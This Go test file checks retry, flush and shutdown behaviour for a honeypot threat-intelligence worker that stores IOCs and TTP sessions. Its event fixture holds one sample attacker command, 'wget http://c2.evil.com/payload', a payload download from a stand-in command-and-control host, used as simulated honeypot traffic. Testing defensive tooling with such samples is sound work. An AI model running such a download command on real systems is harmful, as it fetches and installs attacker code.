package intelligence

import (
	"context"
	"errors"
	"sync/atomic"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// flakyDB fails its IOC and session writes while told to.
type flakyDB struct {
	fakeDB
	failIOCs, failSessions atomic.Bool
	sessions               atomic.Int64
}

var errDBDown = errors.New("database unavailable")

func (f *flakyDB) InsertIOCs(ctx context.Context, iocs []*database.IOC) error {
	if f.failIOCs.Load() {
		return errDBDown
	}
	return f.fakeDB.InsertIOCs(ctx, iocs)
}

func (f *flakyDB) UpsertTTPSession(ctx context.Context, s *database.TTPSession) error {
	if f.failSessions.Load() {
		return errDBDown
	}
	f.sessions.Add(1)
	return nil
}

func wgetEvent(ts time.Time) *database.Event {
	return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: "203.0.113.5",
		Command: "wget http://c2.evil.com/payload", Timestamp: ts}
}

func flakyWorker(t *testing.T, db *flakyDB, window time.Duration) *Worker {
	t.Helper()
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	return NewWorker(NewClassifier(loader, NewTTPBuilder(window)), db, time.Hour, 100)
}

// TestWorkerRetriesFailedIOCWrites: the events are marked classified before
// their IOCs are written, so an insert that failed lost those IOCs for good.
// They are now kept and written on a later pass, with or without new events.
func TestWorkerRetriesFailedIOCWrites(t *testing.T) {
	db := &flakyDB{}
	db.events = []*database.Event{wgetEvent(time.Now().UTC())}
	w := flakyWorker(t, db, time.Hour)
	db.failIOCs.Store(true)
	w.runOnce(context.Background())
	if db.iocCount.Load() != 0 || len(w.pendingIOCs) == 0 {
		t.Fatalf("with the database down: %d written, %d pending", db.iocCount.Load(), len(w.pendingIOCs))
	}
	want := int64(len(w.pendingIOCs))

	db.failIOCs.Store(false)
	db.events = nil // no new traffic
	w.drain(context.Background())
	if db.iocCount.Load() != want || len(w.pendingIOCs) != 0 {
		t.Fatalf("after the database is back: %d of %d written, %d pending", db.iocCount.Load(), want, len(w.pendingIOCs))
	}
}

// TestWorkerFlushesExpiredSessionsWhenIdle: expired TTP sessions were written
// only after a batch with events, so once traffic stopped the last sessions
// stayed in memory, never written.
func TestWorkerFlushesExpiredSessionsWhenIdle(t *testing.T) {
	db := &flakyDB{}
	db.events = []*database.Event{wgetEvent(time.Now().UTC())}
	w := flakyWorker(t, db, 20*time.Millisecond)
	if n, _ := w.runBatch(context.Background()); n != 1 {
		t.Fatalf("classified %d events", n)
	}
	if len(w.classifier.ttpBuilder.GetActiveSessions()) == 0 {
		t.Fatal("the event opened no TTP session")
	}
	time.Sleep(60 * time.Millisecond)

	db.events = nil
	w.drain(context.Background())
	if db.sessions.Load() == 0 {
		t.Fatal("an expired session was not written while no events came in")
	}
}

// TestWorkerRetriesFailedSessionWrites: a session whose write failed was
// already removed from the builder and lost.
func TestWorkerRetriesFailedSessionWrites(t *testing.T) {
	db := &flakyDB{}
	db.events = []*database.Event{wgetEvent(time.Now().UTC().Add(-time.Hour))}
	w := flakyWorker(t, db, time.Minute)
	db.failSessions.Store(true)
	w.runOnce(context.Background())
	if db.sessions.Load() != 0 || len(w.pendingSessions) != 1 {
		t.Fatalf("with the database down: %d written, %d pending", db.sessions.Load(), len(w.pendingSessions))
	}
	db.failSessions.Store(false)
	db.events = nil
	w.drain(context.Background())
	if db.sessions.Load() != 1 || len(w.pendingSessions) != 0 {
		t.Fatalf("after the database is back: %d written, %d pending", db.sessions.Load(), len(w.pendingSessions))
	}
}

// TestWorkerShutdownWritesSessionsInProgress: a session still active when the
// worker stops lives only in memory; it is written on the way out.
func TestWorkerShutdownWritesSessionsInProgress(t *testing.T) {
	db := &flakyDB{}
	db.events = []*database.Event{wgetEvent(time.Now().UTC())}
	w := flakyWorker(t, db, time.Hour)
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() { w.Run(ctx); close(done) }()
	for deadline := time.Now().Add(5 * time.Second); db.taggedCount.Load() == 0; time.Sleep(5 * time.Millisecond) {
		if time.Now().After(deadline) {
			t.Fatal("the worker classified nothing")
		}
	}
	if db.sessions.Load() != 0 {
		t.Fatal("an active session was written before the worker stopped")
	}
	cancel()
	<-done
	if db.sessions.Load() == 0 {
		t.Fatal("the session in progress was not written when the worker stopped")
	}
}

// TestWorkerRetryBuffersAreBounded: a database down for long keeps only the
// newest IOCs and sessions.
func TestWorkerRetryBuffersAreBounded(t *testing.T) {
	db := &flakyDB{}
	w := flakyWorker(t, db, time.Hour)
	db.failIOCs.Store(true)
	iocs := make([]*database.IOC, maxPendingIOCs+10)
	for i := range iocs {
		iocs[i] = &database.IOC{Value: "v"}
	}
	w.writeIOCs(context.Background(), iocs)
	if len(w.pendingIOCs) != maxPendingIOCs || w.pendingIOCs[len(w.pendingIOCs)-1] != iocs[len(iocs)-1] {
		t.Fatalf("%d pending IOCs kept", len(w.pendingIOCs))
	}
	base := time.Now()
	for i := 0; i < maxPendingSessions+5; i++ {
		w.queueSession(&database.TTPSession{SessionID: "s" + time.Duration(i).String(), LastSeen: base.Add(time.Duration(i) * time.Second)})
	}
	if len(w.pendingSessions) != maxPendingSessions {
		t.Fatalf("%d pending sessions kept", len(w.pendingSessions))
	}
	if _, ok := w.pendingSessions["s0s"]; ok {
		t.Fatal("the oldest session was kept over newer ones")
	}
}
